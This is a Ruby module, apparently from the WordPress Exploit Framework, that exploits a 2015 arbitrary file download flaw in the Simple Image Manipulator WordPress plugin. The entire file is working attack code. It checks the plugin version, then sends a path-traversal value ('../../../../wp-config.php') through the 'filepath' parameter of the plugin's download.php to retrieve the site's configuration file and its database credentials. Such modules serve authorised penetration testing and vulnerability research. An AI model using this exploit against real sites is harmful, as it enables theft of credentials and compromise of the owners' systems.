# frozen_string_literal: true

class Wpxf::Auxiliary::SimpleImageManipulatorArbitraryFileDownload < Wpxf::Module
  include Wpxf::WordPress::FileDownload

  def initialize
    super

    update_info(
      name: 'Simple Image Manipulator Arbitrary File Download',
      author: [
        'Larry W. Cashdollar', # Disclosure
        'rastating'            # WPXF module
      ],
      references: [
        ['WPVDB', '8123'],
        ['EDB', '37753'],
        ['URL', 'http://www.vapid.dhs.org/advisory.php?v=147']
      ],
      date: 'Jun 16 2015'
    )
  end

  def check
    check_plugin_version_from_readme('simple-image-manipulator')
  end

  def default_remote_file_path
    '../../../../wp-config.php'
  end

  def working_directory
    'wp-content/plugins/simple-image-manipulator/controller/'
  end

  def downloader_url
    normalize_uri(wordpress_url_plugins, 'simple-image-manipulator', 'controller', 'download.php')
  end

  def download_request_params
    { 'filepath' => remote_file }
  end
end
